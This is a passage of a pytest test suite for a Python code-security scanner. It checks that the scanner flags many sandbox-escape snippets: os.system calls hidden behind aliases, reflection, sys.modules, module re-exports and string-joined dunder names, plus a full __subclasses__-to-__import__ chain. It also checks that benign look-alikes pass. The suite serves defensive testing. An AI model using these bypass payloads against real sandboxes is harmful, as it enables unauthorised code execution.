    def test_should_detect_destructured_loop_target_alias_call(self):
        result = scan_code_security("import os\nfor (module,) in ((os,),):\n    module.system('id')")
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_not_leak_comprehension_target_alias(self):
        code = "import os\nmodule = object()\n[module for module in (os,)]\nmodule.system('not the os module')"
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_preserve_named_expression_alias_from_comprehension(self):
        code = "import os\n[(module := os) for _ in (None,)]\nmodule.system('id')"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_alias_after_zero_iteration_for_loop(self):
        code = """
import os
module = os
for _ in ():
    module = object()
module.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_preserve_alias_bound_while_evaluating_for_iterable(self):
        code = """
import os
for _ in [(module := os)][0:0]:
    module = object()
module.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_alias_after_zero_iteration_async_for_loop(self):
        code = """
import os

async def run():
    module = os
    async for _ in empty():
        module = object()
    module.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_detect_alias_after_zero_iteration_while_loop(self):
        code = """
import os
module = os
while False:
    module = object()
module.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_preserve_alias_bound_while_evaluating_while_condition(self):
        code = """
import os
module = object()
while (module := os) and False:
    module = object()
module.system('id')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "expression",
        [
            "condition or (module := object())",
            "condition and (module := object())",
            "(module := object()) if condition else None",
            "2 < 1 < (module := object())",
        ],
        ids=["bool-or", "bool-and", "conditional-expression", "chained-comparison"],
    )
    def test_should_preserve_alias_when_expression_may_short_circuit(self, expression):
        code = f"import os\nmodule = os\n{expression}\nmodule.spawnv()"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.spawnv()" in violation for violation in result.violations)

    def test_should_allow_alias_rebound_before_every_boolop_exit(self):
        code = "import os\nmodule = os\n(module := object()) or condition\nmodule.system('ordinary object')"
        assert scan_code_security(code).is_safe is True

    def test_should_preserve_match_guard_assignment_on_fallthrough(self):
        code = """
import os
module = object()
match value:
    case 1 if ((module := os) and False):
        pass
    case _:
        module.spawnv()
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.spawnv()" in violation for violation in result.violations)

    def test_should_recognize_nested_irrefutable_match_as_shadow(self):
        code = """
import os

class Safe:
    def system(self, value):
        return value

safe = Safe()
match safe:
    case _ as os:
        pass
os.system('ordinary object')
"""
        assert scan_code_security(code).is_safe is True

    def test_should_detect_alias_from_try_body_after_handler_rebinds(self):
        code = """
import os
module = object()
try:
    module = os
except Exception:
    module = object()
module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    def test_should_detect_alias_from_try_else_after_handler_rebinds(self):
        code = """
import os
module = object()
try:
    pass
except Exception:
    module = object()
else:
    module = os
module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    def test_should_scan_finally_with_partial_try_alias_state(self):
        code = """
import os
module = object()
try:
    module = os
    may_raise()
finally:
    module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    @pytest.mark.parametrize("suite", ["handler", "else"])
    @pytest.mark.parametrize("nested", [False, True], ids=["direct", "nested-if"])
    def test_should_scan_finally_with_partial_handler_or_else_alias_state(self, suite, nested):
        statements = (
            "    if condition:\n        module = os\n        may_raise()\n        module = object()"
            if nested
            else "    module = os\n    may_raise()\n    module = object()"
        )
        branch = (
            f"except Exception:\n{statements}"
            if suite == "handler"
            else f"except Exception:\n    pass\nelse:\n{statements}"
        )
        code = f"""
import os
module = object()
try:
    may_raise()
{branch}
finally:
    module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    def test_should_apply_finally_rebinding_to_all_continuing_paths(self):
        code = """
import os
module = os
try:
    may_raise()
except Exception:
    pass
finally:
    module = object()
module.getenv('not the os module')
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_not_leak_deferred_function_aliases_into_finally(self):
        code = """
import os
module = object()
try:
        def deferred():
            module = os
            return None
finally:
    module.getenv('not the os module')
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    @pytest.mark.skipif(sys.version_info < (3, 11), reason="except* syntax requires Python 3.11")
    def test_should_detect_alias_from_try_star_body_after_handler_rebinds(self):
        code = """
import os
module = object()
try:
    module = os
except* Exception:
    module = object()
module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)

    @pytest.mark.skipif(sys.version_info < (3, 11), reason="except* syntax requires Python 3.11")
    def test_should_preserve_alias_between_try_star_handlers(self):
        code = """
import os
module = object()
try:
    may_raise()
except* ValueError:
    module = os
except* TypeError:
    module.getenv('SECRET')
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.getenv()" in violation for violation in result.violations)


class TestScanCodeSecurityIndirectReferenceBypass:
    """Restricted modules and builtins must stay restricted through indirection."""

    @pytest.mark.parametrize(
        "code",
        [
            "import os\ndef run(module):\n    module.system('id')\nrun(os)",
            "import os\ndef run(module=os):\n    module.system('id')\nrun()",
            "import os\nmodules = {}\nmodules['os'] = os\nmodules['os'].system('id')",
            "import os\nmodules = [os]\nmodules[0].system('id')",
            "import os\nclass Holder:\n    pass\nholder = Holder()\nholder.module = os\nholder.module.system('id')",
            "dangerous = exec\ndangerous(\"import os\\nos.system('id')\")",
            "import builtins\nbuiltins.exec(\"import os\\nos.system('id')\")",
            'import builtins\ngetattr(builtins, "exec")("import os\\nos.system(\'id\')")',
            "import builtins\nvars(builtins)[\"eval\"](\"__import__('os').system('id')\")",
            "import os\ndangerous = os.system\ndangerous('id')",
            "import os\nmodule = os\ndef run(value):\n    value.system('id')\nrun(module)",
            "import os\ndef run(module):\n    module.system('id')\nrun(os if True else object())",
            "import os\ngetattr(os if True else object(), 'system')('id')",
            "import os\ndef run(module):\n    module.system('id')\nrun([module for module in (os,)][0])",
            "import os\ndef run(module):\n    module.system('id')\nrun(next(module for module in (os,)))",
            "def expose():\n    return exec\nexpose()(\"print('unsafe')\")",
            "import os\ndef expose():\n    return os\nexpose().system('id')",
            "def expose():\n    yield exec\nnext(expose())(\"print('unsafe')\")",
            "import os\ndef expose():\n    yield from (os,)\nnext(expose()).system('id')",
            "(lambda: exec)()(\"print('unsafe')\")",
            "import os\nmodule = os if flag else object()\nmodule.system('id')",
            "import os\nmodule = [os][0]\nmodule.system('id')",
            "import os\nmodule = [item for item in (os,)][0]\nmodule.system('id')",
            "import os\n(module,) = ([os][0],)\nmodule.system('id')",
            "import os\nif module := [os][0]:\n    module.system('id')",
            "import os\nmodule: object = os if flag else object()\nmodule.system('id')",
            "import os\ngetattr(os.system, '__call__')('id')",
        ],
        ids=[
            "function-argument",
            "function-default",
            "dict-entry",
            "list-entry",
            "object-attribute",
            "builtin-alias",
            "builtins-attribute",
            "builtins-getattr",
            "builtins-vars",
            "module-callable-alias",
            "module-alias-as-argument",
            "conditional-expression-as-argument",
            "conditional-expression-in-getattr",
            "list-comprehension-as-argument",
            "generator-expression-as-argument",
            "returned-builtin",
            "returned-module",
            "yielded-builtin",
            "yielded-module",
            "lambda-returned-builtin",
            "conditional-assignment",
            "subscript-assignment",
            "comprehension-assignment",
            "nested-unpacking-assignment",
            "named-expression-assignment",
            "annotated-assignment",
            "getattr-dangerous-callable-receiver",
        ],
    )
    def test_should_detect_indirect_dangerous_reference(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import pathlib\n[pathlib.__getattribute__][0]('os').system('id')",
            "import pathlib\n{'reflect': pathlib.__getattribute__}['reflect']('os').system('id')",
            "import os\n(os.system,)[0]('id')",
            "import os\n[os][0].system('id')",
            "import pathlib\n(pathlib,)[0].os.spawnv()",
            "import glob\n{'module': glob}['module'].os.fork()",
            "import os\n(f := os.system)('id')",
            "import pathlib\n(module := pathlib).os.system('id')",
            "import os\n[call for call in [os.system]][0]('id')",
            "import pathlib\n[module for module in [pathlib]][0].os.forkpty()",
            "import os\n(False or os.system)('id')",
            "import pathlib\n(False or pathlib).os.posix_spawn()",
            "import os\n(True and os.system)('id')",
        ],
        ids=[
            "list-reflective-callee",
            "dict-reflective-callee",
            "tuple-dangerous-callee",
            "list-module-receiver",
            "tuple-reexport-receiver",
            "dict-reexport-receiver",
            "named-expression-callee",
            "named-expression-receiver",
            "comprehension-callee",
            "comprehension-receiver",
            "bool-or-callee",
            "bool-or-receiver",
            "bool-and-callee",
        ],
    )
    def test_should_detect_dangerous_inline_call_target(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "[(lambda value: value)][0]('ok')",
            "{'call': str.upper}['call']('ok')",
            "(str.lower,)[0]('OK')",
            "[call for call in [str]][0]('ok')",
            (
                "class Client:\n"
                "    def system(self, value):\n"
                "        return value\n"
                "client = Client()\n"
                "(False or client).system('status')"
            ),
            (
                "class Client:\n"
                "    def system(self, value):\n"
                "        return value\n"
                "(client := Client()).system('status')"
            ),
        ],
        ids=[
            "list-lambda",
            "dict-method",
            "tuple-method",
            "comprehension-callable",
            "bool-op-ordinary-receiver",
            "named-expression-ordinary-receiver",
        ],
    )
    def test_should_allow_safe_inline_call_target(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import os\ncall = os.system\n(call := print)('safe')",
            (
                "import os\n"
                "class Safe:\n"
                "    def system(self, value):\n"
                "        return value\n"
                "module = os\n"
                "(module := Safe()).system('safe')"
            ),
        ],
        ids=["callable-rebind", "receiver-rebind"],
    )
    def test_should_allow_safe_named_expression_rebinding(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_detect_indirection_in_component_shaped_code(self):
        code = """
import os
from lfx.custom import Component
from lfx.io import Output
from lfx.schema import Message

class IndirectCommandComponent(Component):
    outputs = [Output(name="result", display_name="Result", method="run_command")]

    def run_command(self) -> Message:
        def invoke(module):
            module.system("id")

        invoke(os)
        return Message(text="done")
"""
        result = scan_code_security(code)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import os\nmodules = [os.path]\npath = modules[0].join('a', 'b')",
            "import os\ndef join(path_module=os.path):\n    return path_module.join('a', 'b')\njoin()",
            "import os\ndef join(path_module):\n    return path_module.join('a', 'b')\njoin(os.path)",
            "import os\nconsume(getattr(os, 'path'))",
        ],
        ids=[
            "module-reexport-in-list",
            "module-reexport-default",
            "module-reexport-argument",
            "getattr-module-reexport-argument",
        ],
    )
    def test_should_preserve_restricted_module_reexport_boundary(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.path" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            (
                "class Client:\n"
                "    def system(self, value):\n"
                "        return value\n"
                "client = Client()\n"
                "def run(obj):\n"
                "    obj.system('status')\n"
                "run(client)"
            ),
            "import requests\nclass Holder:\n    pass\nholder = Holder()\nholder.client = requests\nholder.client.get('https://example.com')",
            "import builtins\nsize = builtins.len([1, 2, 3])",
            'import builtins\nsize = getattr(builtins, "len")([1, 2, 3])',
            "dangerous = exec\ndangerous = print\ndangerous('safe')",
            "import os\nmodule = os\nconsume([module for module in (object(),)])",
            "import requests\ndef expose():\n    return requests\nexpose().get('https://example.com')",
            "import os\n(module,) = (os.path,)\nmodule.join('a', 'b')",
        ],
        ids=[
            "ordinary-object-method",
            "safe-module-in-attribute",
            "safe-builtin-attribute",
            "safe-builtin-getattr",
            "dangerous-alias-rebound",
            "comprehension-target-shadows-restricted-module",
            "returned-safe-module",
            "unpacked-safe-module-attribute",
        ],
    )
    def test_should_allow_safe_indirect_reference(self, code):
        result = scan_code_security(code)
        assert result.is_safe is True


class TestScanCodeSecurityRuntimeModuleBypass:
    """Runtime module lookup and reflection must not bypass dangerous calls."""

    def test_should_detect_sys_modules_attribute_call(self):
        result = scan_code_security("sys.modules['os'].system('id')")
        assert result.is_safe is False

    def test_should_detect_getattr_from_sys_modules(self):
        result = scan_code_security("getattr(sys.modules['os'], 'system')('id')")
        assert result.is_safe is False

    def test_should_detect_aliased_sys_modules_access(self):
        result = scan_code_security("import sys as runtime\nruntime.modules['os'].system('id')")
        assert result.is_safe is False

    def test_should_detect_imported_sys_modules_access(self):
        result = scan_code_security("from sys import modules\nmodules['os'].system('id')")
        assert result.is_safe is False

    def test_should_detect_reflective_dangerous_call(self):
        result = scan_code_security("import os\ngetattr(os, 'system')('id')")
        assert result.is_safe is False

    def test_should_detect_reflective_dangerous_call_through_getattr_alias(self):
        result = scan_code_security("import os\nreflect = getattr\nreflect(os, 'system')('id')")
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import builtins\nimport os\nbuiltins.getattr(os, 'system')('id')",
            "import builtins as b\nimport os\nb.getattr(os, 'system')('id')",
            "from builtins import getattr as reflect\nimport os\nreflect(os, 'system')('id')",
        ],
    )
    def test_should_detect_qualified_or_imported_builtin_getattr(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in violation for violation in result.violations)

    def test_should_allow_qualified_builtin_getattr_on_ordinary_object(self):
        result = scan_code_security("import builtins\nvalue = builtins.getattr(self, 'field', None)")
        assert result.is_safe is True

    def test_should_detect_dynamic_reflective_module_access(self):
        result = scan_code_security("import os\nvalue = getattr(os, self.method_name)")
        assert result.is_safe is False

    def test_should_detect_reflective_sys_modules_access(self):
        result = scan_code_security("getattr(sys, 'modules')['os'].system('id')")
        assert result.is_safe is False

    def test_should_allow_safe_sys_attribute(self):
        result = scan_code_security("import sys\nversion = sys.version_info")
        assert result.is_safe is True

    def test_should_allow_reflective_safe_module_attribute(self):
        result = scan_code_security("import os\npath_module = getattr(os, 'path')")
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import math\nresult = getattr.__call__(math, 'sqrt')(4)",
            "import math\nreflect = getattr\nresult = reflect.__call__(math, 'sqrt')(4)",
            "import builtins, math\nresult = builtins.getattr.__call__(math, 'sqrt')(4)",
        ],
        ids=["direct-getattr-call", "aliased-getattr-call", "builtins-getattr-call"],
    )
    def test_should_detect_dunder_getattr_call_variants(self, code):
        # ``.__call__`` is a dunder attribute read; all dunder attribute access
        # is rejected (H1-3977745), even for an otherwise safe callable.
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import pathlib\ngetattr.__call__(pathlib, 'os').system('id')",
            "import glob\nreflect = getattr\nreflect.__call__(glob, 'os').spawnv()",
            "import pathlib\ngetattr.__call__(pathlib, selector)",
        ],
        ids=["direct-dangerous-selector", "aliased-dangerous-selector", "dynamic-selector"],
    )
    def test_should_detect_dangerous_getattr_call_variants(self, code):
        assert scan_code_security(code).is_safe is False

    def test_should_detect_dynamic_getattr_on_ordinary_objects(self):
        # Fail closed (H1-3977745 / H1-3980911): the receiver's type cannot be
        # proven from the AST and a runtime-built attribute name can resolve to
        # a sandbox-escape dunder, so it is rejected on any receiver even when
        # the receiver is an ordinary object with a default supplied.
        result = scan_code_security("field = 'value'\nvalue = getattr(self, field, None)")
        assert result.is_safe is False
        assert any("Dynamic getattr()" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            "import pathlib\npathlib.sys.modules['os'].system('id')",
            "import os\nos.sys.modules['os'].spawnv()",
            "import glob\nglob.sys.modules['os'].fork()",
            "import pathlib\npathlib.os.sys.modules['os'].posix_spawn()",
            "from pathlib import sys as runtime\nruntime.modules['os'].system('id')",
            "from os.path import sys as runtime\nruntime.modules['os'].spawnve()",
        ],
        ids=[
            "pathlib-sys",
            "os-sys",
            "glob-sys",
            "chained-os-sys",
            "pathlib-imported-sys",
            "os-path-imported-sys",
        ],
    )
    def test_should_detect_known_reexported_restricted_modules(self, code):
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            "import example_module\nexample_module.os.system('ordinary object')",
            "import example_module\nsecret = example_module.os.environ",
            "import example_module\ngetattr(example_module, 'os').system('ordinary object')",
            "import example_module\nitems = example_module.sys.modules",
            "from example_module import os\nos.system('ordinary object')",
            "from example_module import sys\nitems = sys.modules",
        ],
        ids=[
            "module-os-call",
            "module-os-read",
            "module-os-reflection",
            "module-sys-attribute",
            "imported-os",
            "imported-sys",
        ],
    )
    def test_should_not_canonicalize_unknown_module_attributes(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            "import pathlib\npathlib.__loader__.load_module('os').system('id')",
            "import pathlib\npathlib.__spec__.loader.load_module('os').system('id')",
            "import pathlib\ngetattr(pathlib, '__loader__').load_module('os').system('id')",
            "import pathlib\npathlib.__dict__['__loader__'].load_module('os').system('id')",
            "import glob\nglob.__dict__.get('__spec__').loader.load_module('os').system('id')",
            "import glob\nvars(glob)['__loader__'].load_module('os').system('id')",
        ],
        ids=[
            "module-loader",
            "module-spec-loader",
            "getattr-loader",
            "module-dict-loader",
            "module-dict-spec",
            "vars-loader",
        ],
    )
    def test_should_detect_module_loader_escape(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("__loader__" in violation or "__spec__" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "getattr(().__class__.__bases__[0], '__sub' + 'classes__')()",
                id="computed-receiver",
            ),
            pytest.param(
                "target = object\ngetattr(target, '__sub' + 'classes__')()",
                id="name-receiver",
            ),
            pytest.param(
                "__builtins__.getattr(object, '__sub' + 'classes__')()",
                id="qualified-builtins-dict",
            ),
            pytest.param(
                "reflect = __builtins__.getattr\nreflect(object, '__sub' + 'classes__')()",
                id="aliased-builtins-dict",
            ),
        ],
    )
    def test_should_detect_computed_dangerous_dunder_getattr(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("__subclasses__" in violation for violation in result.violations)

    def test_should_allow_computed_safe_getattr_on_ordinary_object(self):
        result = scan_code_security("getattr(record, 'display' + '_name', None)")
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("method = vars(type)['__subclasses__']", id="vars-type-subscript"),
            pytest.param("method = vars(type)['__sub' + 'classes__']", id="vars-type-computed-key"),
            pytest.param("method = vars(type).get('__subclasses__')", id="vars-type-get"),
            pytest.param("method = vars(type).__getitem__('__subclasses__')", id="vars-type-getitem"),
            pytest.param("method = dict.get(vars(type), '__subclasses__')", id="unbound-dict-get"),
            pytest.param("method = dict.__getitem__(vars(type), '__subclasses__')", id="unbound-dict-getitem"),
            pytest.param("lookup = vars(type).get\nmethod = lookup('__subclasses__')", id="aliased-vars-get"),
            pytest.param("method = vars(type).get(*('__subclasses__',))", id="vars-type-get-starred"),
            pytest.param("method = vars(type).__getitem__(*['__subclasses__'])", id="vars-type-getitem-starred-list"),
            pytest.param("method = vars(type).get(*('__subclasses__', None))", id="vars-type-get-starred-default"),
            pytest.param("method = dict.get(vars(type), *('__subclasses__',))", id="unbound-dict-get-starred"),
            pytest.param(
                "method = dict.__getitem__(vars(type), *('__subclasses__',))", id="unbound-dict-getitem-starred"
            ),
            pytest.param(
                "lookup = vars(type).get\nmethod = lookup(*('__subclasses__',))", id="aliased-vars-get-starred"
            ),
            pytest.param("g = vars(init).get('__globals__')", id="opaque-receiver-get-globals"),
            pytest.param("g = namespace['__globals__']", id="opaque-receiver-subscript-globals"),
            pytest.param("b = g['__builtins__']", id="opaque-receiver-subscript-builtins"),
        ],
    )
    def test_should_detect_dangerous_dunder_mapping_reads(self, code):
        """Dunder keys must be blocked regardless of the mapping's receiver."""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("(sandbox escape)" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "def helper():\n    return None\ngetattr(helper, ''.join(['__glob', 'als__']))",
                id="join-list-getattr-globals",
            ),
            pytest.param(
                "getattr(object, ''.join(('__sub', 'classes__')))()",
                id="join-tuple-getattr-subclasses",
            ),
            pytest.param(
                "getattr(helper, ''.join(part for part in ['__glob', 'als__']))",
                id="join-generator-getattr-globals",
            ),
            pytest.param(
                "import os\ngetattr(os, ''.join(['sys', 'tem']))('id')",
                id="join-getattr-os-system",
            ),
            pytest.param(
                "import os\ngetattr(os, ''.join(['get', 'env']))('HOME')",
                id="join-getattr-os-getenv",
            ),
            pytest.param(
                "import os\nname = ''.join(['sy', 'stem'])\ngetattr(os, name)('id')",
                id="join-name-then-getattr",
            ),
            pytest.param(
                "import pathlib\npathlib.__dict__[''.join(['o', 's'])].fork()",
                id="join-module-dict-key",
            ),
        ],
    )
    def test_should_detect_join_computed_dangerous_names(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_join_computed_end_to_end_rce_payload(self):
        """H1-3995693: join-computed reflection must not recover globals/builtins."""
        code = (
            "def helper():\n    return None\n\n"
            "globals_map = getattr(helper, ''.join(['__glob', 'als__']))\n"
            "builtins_map = globals_map[''.join(['__built', 'ins__'])]\n"
            "import_function = builtins_map[''.join(['__imp', 'ort__'])]\n"
            "os_module = import_function(''.join(['o', 's']))\n"
            "os_module.system('placeholder')\n"
        )
        result = scan_code_security(code)
        assert result.is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param("config = {'timeout': 5}\nvalue = config.get('timeout')", id="dict-get-safe-key"),
            pytest.param("record = {'name': 'x'}\nname = record['name']", id="subscript-safe-key"),
            pytest.param("class Record:\n    value = 1\ndata = vars(Record())", id="vars-plain-read"),
            pytest.param("import glob\nchecker = vars(glob).get('magic_check')", id="vars-module-safe-key"),
            pytest.param("d = {}\nvalue = d.get('__name__')", id="non-dangerous-dunder-key"),
            pytest.param("config = {'timeout': 5}\nvalue = config.get(*('timeout',))", id="dict-get-starred-safe-key"),
            pytest.param("d = {}\nvalue = d.get(*('__name__',))", id="starred-non-dangerous-dunder-key"),
            pytest.param("keys = ()\nconfig = {'timeout': 5}\nvalue = config.get(*keys)", id="dict-get-opaque-starred"),
        ],
    )
    def test_should_allow_safe_mapping_reads(self, code):
        assert scan_code_security(code).is_safe is True

    def test_should_detect_vars_subclasses_subscript_rce(self):
        """H1-3989735: vars() subscript access to __subclasses__ bypasses the scanner."""
        code = """
obj = type(()).mro()[1]
method = vars(type)["__subclasses__"]
subs = method(obj)
for s in subs:
    try:
        init = vars(s).get("__init__")
        if init:
            g = vars(init).get("__globals__")
            if g and "__builtins__" in g:
                b = g["__builtins__"]
                if isinstance(b, dict) and "__import__" in b:
                    os_mod = b["__import__"]("os")
                    result = os_mod.popen("id").read()
                    break
    except Exception:
        pass
"""
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("__subclasses__" in violation for violation in result.violations)

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "separator = '-'\nvalue = separator.join(['a', 'b'])",
                id="aliased-separator-join",
            ),
            pytest.param(
                "value = ''.join(part for part in ['a', 'b'] if part)",
                id="filtered-generator-join",
            ),
            pytest.param(
                "value = ''.join([prefix, 'b'])",
                id="dynamic-element-join",
            ),
            pytest.param(
                "getattr(record, ''.join(['display', '_name']), None)",
                id="safe-join-getattr",
            ),
        ],
    )
    def test_should_allow_unresolved_or_safe_join_strings(self, code):
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_detect_reflective_call_through_assignment_alias(self):
        result = scan_code_security("import os\nmodule = os\ngetattr(module, 'system')('id')")
        assert result.is_safe is False

    def test_should_detect_dynamic_getattr_through_assignment_alias(self):
        result = scan_code_security("import os\nmodule = os\nvalue = getattr(module, self.method_name)")
        assert result.is_safe is False

    def test_should_allow_getattr_after_alias_is_rebound_to_safe_value(self):
        code = "import os\nmodule = os\nmodule = object()\nvalue = getattr(module, 'system', None)"
        result = scan_code_security(code)
        assert result.is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import pathlib\ngetattr(pathlib, 'o' + 's').spawnv()",
                id="getattr-static-string",
            ),
            pytest.param(
                "import glob as module\nreflect = getattr\nreflect(module, 'os').execlpe()",
                id="aliased-getattr-and-module",
            ),
            pytest.param(
                "import pathlib\npathlib.__dict__['os'].fork()",
                id="module-dict",
            ),
            pytest.param(
                "import glob as module\nmembers = module.__dict__\nmembers['o' + 's'].spawnve()",
                id="aliased-module-dict",
            ),
            pytest.param(
                "import pathlib\nvars(pathlib)['os'].write()",
                id="vars",
            ),
            pytest.param(
                "import glob as module\nmembers = vars\nmembers(module)['o' + 's'].spawnvpe()",
                id="aliased-vars",
            ),
            pytest.param(
                "import pathlib\nvars(pathlib).get('o' + 's').spawnlp()",
                id="vars-mapping-get",
            ),
            pytest.param(
                "import glob\nmembers = glob.__dict__\nmembers.__getitem__('os').fork()",
                id="module-dict-getitem",
            ),
            pytest.param(
                "import pathlib\npathlib.__getattribute__('os').startfile('tool.exe')",
                id="module-getattribute",
            ),
            pytest.param(
                "import glob\nreflect = glob.__getattribute__\nreflect('o' + 's').forkpty()",
                id="aliased-module-getattribute",
            ),
            pytest.param(
                "import pathlib\nobject.__getattribute__(pathlib, 'o' + 's').spawnle()",
                id="object-getattribute",
            ),
            pytest.param(
                "import glob\ngetattr(glob, '__dict__')['os'].spawnlpe()",
                id="getattr-module-dict",
            ),
            pytest.param(
                "import pathlib\nmodule = object()\nif condition:\n    module = pathlib\n"
                "getattr(module, 'os').posix_spawnp()",
                id="control-flow-module-alias",
            ),
            pytest.param(
                "import glob\nmodule = glob if condition else object()\ngetattr(module, 'os').spawnv()",
                id="conditional-expression-module-alias",
            ),
            pytest.param(
                "import pathlib\nname = 'o' + value\ngetattr(pathlib, name).system('id')",
                id="dynamic-getattr",
            ),
            pytest.param(
                "import pathlib\ngetattr(pathlib, f\"{'o'}s\").spawnvp()",
                id="static-f-string-getattr",
            ),
            pytest.param(
                "import pathlib\npathlib.os.__getattribute__('system')('id')",
                id="reexported-os-getattribute",
            ),
            pytest.param(
                "import glob\nmodule = object()\nmatch selection:\n    case 1:\n        module = glob\n"
                "    case _:\n        module = object()\ngetattr(module, 'os').spawnv()",
                id="match-case-module-alias",
            ),
            pytest.param(
                "import pathlib\nname = 'o' + value\npathlib.__getattribute__(name).system('id')",
                id="dynamic-module-getattribute",
            ),
            pytest.param(
                "import pathlib\nname = 'o' + value\npathlib.__dict__[name].system('id')",
                id="dynamic-module-dict-subscript",
            ),
            pytest.param(
                "import glob\nname = 'o' + value\nglob.__dict__.get(name).spawnv()",
                id="dynamic-module-dict-get",
            ),
        ],
    )
    def test_should_detect_reflective_os_module_reexports(self, code):
        result = scan_code_security(code)
        assert result.is_safe is False
        assert result.violations

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import glob\nglob = object()\ngetattr(glob, 'os').system('ordinary object')",
                id="rebound-module-name",
            ),
            pytest.param(
                "import glob\nglob = object()\nvars = lambda value: {'os': value}\nvars(glob)['os'].glob('file')",
                id="shadowed-vars",
            ),
            pytest.param(
                "import logging\nos_module = getattr(logging, 'os')\npath = os_module.path.join('a', 'b')",
                id="safe-os-member",
            ),
            pytest.param(
                "import glob\nglob = object()\nclass Holder:\n    os = object()\nholder = Holder()\nreflect = getattr\n"
                "reflect = lambda *args: holder\nreflect(glob, 'os').system('ordinary object')",
                id="rebound-getattr-alias",
            ),
            pytest.param(
                "import glob\nfiles = glob.glob('*.txt')\nname = getattr(glob, f\"{'g'}lob\")('b')",
                id="direct-glob-and-static-safe-getattr",
            ),
            pytest.param(
                "import glob\nfiles = glob.glob('*.txt')\npath_class = glob.glob",
                id="direct-glob-and-safe-member",
            ),
            pytest.param(
                "import glob\npath_class = vars(glob)['glob']",
                id="vars-safe-member",
            ),
            pytest.param(
                "import glob\nchecker = vars(glob).get('magic_check')",
                id="vars-mapping-get-safe-member",
            ),
        ],
    )
    def test_should_allow_safe_reflective_os_like_access(self, code):
        assert scan_code_security(code).is_safe is True

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "class Holder:\n    pass\nholder = Holder()\nholder.__getattribute__('os').system('ordinary object')",
                id="ordinary-object-getattribute",
            ),
            pytest.param(
                "import glob\nfiles = glob.glob('*.txt')\npath_class = glob.__dict__['magic_check']",
                id="direct-glob-and-safe-dict-member",
            ),
            pytest.param(
                "import glob\npath_class = object.__getattribute__(glob, 'glob')",
                id="object-getattribute-safe-member",
            ),
            pytest.param(
                "import glob\nchecker = dict.get(glob.__dict__, 'magic_check')",
                id="dict-get-safe-member",
            ),
            pytest.param(
                "import glob\nlookup = glob.__dict__.get\npath_class = lookup.__call__('glob')",
                id="normalized-call-safe-member",
            ),
        ],
    )
    def test_should_detect_dunder_reflective_access(self, code):
        # Reflective access through dunder attributes (``__dict__``,
        # ``__getattribute__``, ``__call__``) is rejected even when the member
        # resolved is safe: all dunder attribute access is forbidden
        # (H1-3977745). Use direct attribute access or ``vars()`` instead.
        assert scan_code_security(code).is_safe is False

    @pytest.mark.parametrize(
        "code",
        [
            pytest.param(
                "import pathlib\ndef run(module=pathlib):\n    module.os.system('id')\nrun()",
                id="function-default",
            ),
            pytest.param(
                "import glob\ndef run(module):\n    module.os.spawnv()\nrun(glob)",
                id="function-argument",
            ),
            pytest.param(
